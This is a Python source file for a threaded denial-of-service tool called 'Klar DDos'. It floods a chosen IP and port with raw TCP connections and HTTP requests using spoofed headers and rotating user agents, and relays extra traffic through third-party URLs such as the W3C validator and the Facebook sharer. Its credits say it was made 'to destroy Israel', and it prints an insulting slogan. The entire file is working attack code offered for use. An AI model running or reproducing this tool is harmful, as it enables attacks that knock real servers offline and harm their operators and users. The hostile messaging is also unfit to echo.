import socket
import sys,os
from optparse import OptionParser
import threading,time,sys,logging,urllib.request,random
from time import sleep
from queue import Queue
import rich
from rich.markdown import Markdown
from rich.progress import track
from rich.console import Console


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
target = ""
ports = 0 
levels = 0
fake_ip = ""
hides = 0
console = Console()
already_connected_true = 0
already_connected_false = 1


def live_bro():
            if already_connected_true % hides ==0:
                console.print(f"[{time.ctime(time.time())}] connected : {already_connected_true}",style="green")
            else:
                pass
            if already_connected_false % hides ==0 :
                console.print(f"Wrong : {already_connected_false}",style="red")
            else:
                pass
                
              
                
                

 #Scrypt Typer  
def get_Typer():
	global host
	global port
	global thr
	global item
	global target
	global ports
	global levels
	global fake_ip
	global hides
	optp = OptionParser(add_help_option=False,epilog="Klar DDos")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-l","--level",type="int",dest="turbo",help="default 1 -t 1")
	optp.add_option("-f","--fake",type="str",dest="fake",help="default -f 00.00.00.00")
	optp.add_option("-d","--hide",type="int",dest="hide",help="default -d 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
		usage1()
		sys.exit()
	if opts.host is not None:
		host = opts.host
		target = host
	else:
		pass
	if opts.port is None:
		port = 80
		ports =port
	else:
		port = opts.port
		ports =port
	if opts.turbo is None:
		thr = 1
		levels = thr
	else:
		thr = opts.turbo
		levels = thr
	if opts.fake is not None:
		hos = opts.fake
		fake_ip = hos
	else:
		fake_ip = "999.999.999.999"
	if opts.hide is None:
		hide = 0
		hides = hide
	else:
		hide = opts.hide
		hides = hide
		
		
def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")	

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


#DDOS 1 + MASSEGS
def attack(item):
             with console.status("[bold dark_orange]Finishing Attacks CTRL+Z .....") as status:
                 while True:
                     try:
                         packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
                         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                         s.connect((target,port))
                         s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"),(target,ports))
                         s.sendto(("Host :"+fake_ip+"\r\n\r\n").encode("ascii"),(target,ports))
                         s.close()
                         
                         
                         global already_connected_true
                         already_connected_true +=1
                         console.print(f"attacks [{already_connected_true}] The attack succeeded port[{ports}] server[{target}] level[{levels}] !!!!",style="bold green")
                     
                     except:
                         global already_connected_false
                         already_connected_false +=1
                         console.print(f"attacks [{already_connected_false}] Faced Attack port[{ports}] server[{target}] level[{levels}] ",style="bold red")
                         s.close()
#DDOS 1 NOT MS                   
def attack_2(item):
             live_bro()
             try:
                 while True:
                     packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
                     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                     s.connect((target,port))
                     s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"),(target,ports))
                     s.sendto(("Host :"+fake_ip+"\r\n\r\n").encode("ascii"),(target,ports))
                     s.close()
                         
                         
                     global already_connected_true
                     already_connected_true +=1
                     live_bro()
             except:
                     
                     global already_connected_false
                     already_connected_false +=1
                     s.close()
                     live_bro()
 #DDOS 2 IN MASSEGS
def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target,int(ports)))
			if s.sendto( packet, (target, int(ports)) ):
				s.shutdown(1)
				global already_connected_true
				already_connected_true +=1
				console.print(f"attacks [{already_connected_true}] The attack succeeded {time.ctime(time.time())} !!!!",style="bold green")
			else:
				global already_connected_false
				already_connected_false +=1
				s.shutdown(1)
				console.print(f"attacks [{already_connected_false}] Faced Attack port[{ports}] server[{target}] level[{levels}] ",style="bold red")
			#time.sleep(.1)
	except socket.error as e:
		console.print(f"attacks [{already_connected_false}] Faced Attack  Server is down port[{ports}] server[{target}] level[{levels}] ",style="bold red")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)
		
		
#DDOS 2 IN NOT MS		
def down_it_2(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target,int(ports)))
			if s.sendto( packet, (target, int(ports)) ):
				s.shutdown(1)
				global already_connected_true
				already_connected_true +=1
				live_bro()
			else:
				s.shutdown(1)
				global already_connected_false
				already_connected_false +=1
				live_bro()
				time.sleep(.1)
	except socket.error as e:
	    already_connected_false +=1
	    live_bro()

#DDOS IN MESSAGE
def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()
def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+target)
		w.task_done()
def dos3():
	while True:
		item = q.get()
		attack(item)
		q.task_done()


#DDOS IN NOT MS
def dos_2():
	while True:
		item = q.get()
		down_it_2(item)
		q.task_done()
def dos_3():
	while True:
		item = q.get()
		attack_2(item)
		q.task_done()

def usage():
    console = Console()
    MARKDOWN=("""
         	     Klar DDos Script V 1.1            """)
    md = Markdown(MARKDOWN)
    console.print(md,style="bold green")   
    
    
    
    
def usage1():
    console = Console()
    MARKDOWN="""
         	        
	usage : python KlarDdos.py [-i] [-p] [-l]
        	-h : help
        	-i : server ip
        	-p : port server 
        	-l : Livel Attack {number}
        	-f : Fake ip
            -d : Hide message
	example :
	    python KlarDdos.py -i 92.204.214.136 -p 80 -l 2"""
    md = Markdown(MARKDOWN)
    console.print(md,style="bold green")
    #sys.exit()




def usage2():
    console = Console()
    MARKDOWN2="""
    
                        خرا ع اخرائيل.        
    """
    md = Markdown(MARKDOWN2)
    console.print(md,style="bold green")
    
    
    
    
def usage3():
    console = Console()
    MARKDOWN="""
    Programmer : Dr Data
    Made in : YEMEN
    Telegram : https://t.me/kali_linux_ar
    github : https://github.com/Dr-Data2/KlarDDos
    Tool Information : I was specially made to destroy Israel   
"""
    md = Markdown(MARKDOWN)
    console.print(md,style="bold green")




 #Script Run
def run():
    os.system("clear")
    console.print(f"""
    Hoat : {str(target)}
    Port : {ports}
    Level : {levels}
    Fake ip : {fake_ip}
       """)
    for step in track(range(1500),description="Wait ...."):
        sleep(.001)
    os.system("clear")
    usage()
    usage3()
    usage2()
    for step in track(range(100),description="Starting ...."):
        sleep(.1)
    while True:
        for i in range(int(levels)):
            thread = threading.Thread(target=dos3)
            thread.daemon = True 
            thread.start()
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
            start = time.time()
    		#tasking
            item = 0
            while True:
                if (item>1800): # for no memory crash
                    item=0
                    time.sleep(.1)
                item = item + 1
                q.put(item)
                w.put(item)
            q.join()
            w.join()   

#Script Run IN NOT MS
def run2():
    os.system("clear")
    console.print(f"""
    Hoat : {str(target)}
    Port : {ports}
    Level : {levels}
    Fake ip : {fake_ip}
       """)
    for step in track(range(1500),description="Wait ...."):
        sleep(.001)
    os.system("clear")
    usage()
    usage3()
    usage2()
    while True:
        for i in range(int(levels)):
            
            thread = threading.Thread(target=dos_3)
            thread.daemon = True 
            thread.start()
            
            t = threading.Thread(target=dos_2)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
            
            start = time.time()
    		#tasking
            item = 0
            while True:
                if (item>1800): # for no memory crash
                    item=0
                    time.sleep(.1)
                item = item + 1
                q.put(item)
                w.put(item)
            q.join()
            w.join()   


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        usage1()
        sys.exit()
        #usage2()
    get_Typer()
    user_agent()
    my_bots()
    if len(sys.argv) < 2 :
        usage()
        usage1()
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,int(ports)))
            s.settimeout(1)
            if hides == 0:
                run()
            else:
                run2()
        except socket.error as e:
            console.print("check server ip and port",style="bold dark_orange")
            sleep(2)
            usage()
            usage1()
       
